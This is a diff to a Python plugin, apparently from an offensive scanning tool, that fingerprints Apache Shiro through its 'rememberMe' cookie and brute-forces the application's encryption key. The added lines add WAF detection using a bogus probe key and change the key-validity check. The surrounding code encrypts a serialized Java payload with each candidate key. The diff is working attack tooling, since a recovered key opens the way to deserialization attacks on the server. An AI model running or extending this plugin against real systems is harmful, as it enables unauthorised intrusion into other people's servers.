@@ -19,14 +19,21 @@ class Plugin(BasePlugin):
         self.shuffle_auth_list = True
         self._cookie_name = "rememberMe"
         self._check_value = self._cookie_name + "=deleteMe"
+        self._remember_me_count = -1
 
     def login(self, target, user, passwd):
         return self.check_key(passwd)
 
     def check_app(self, target):
         set_cookie = self.send_encrypt("1")
-        if self._check_value in set_cookie:
-            self.logger.debug("found shiro {}".format(target))
+        count = set_cookie.count(self._check_value)
+        if count > 0:
+            self._remember_me_count = count
+            self.logger.debug("found shiro {}  count {}".format(target, count))
+            if self.check_key('dGhpc25vdGFrZXlhYWN6eg=='):
+                self.logger.info("{} may be have waf".format(target))
+                return False
+
             return True
         else:
             return False
@@ -44,7 +51,8 @@ class Plugin(BasePlugin):
         payload = "rO0ABXNyADJvcmcuYXBhY2hlLnNoaXJvLnN1YmplY3QuU2ltcGxlUHJpbmNpcGFsQ29sbGVjdGlvbqh/WCXGowhKAwABTAAPcmVhbG1QcmluY2lwYWxzdAAPTGphdmEvdXRpbC9NYXA7eHBw                                                                                                              dwEAeA=="
         data = shiro_cbc(key, payload).decode()
         set_cookie = self.send_encrypt(data)
-        if self._check_value not in set_cookie:
+        count = set_cookie.count(self._check_value)
+        if count + 1 == self._remember_me_count:
             return True
 
 
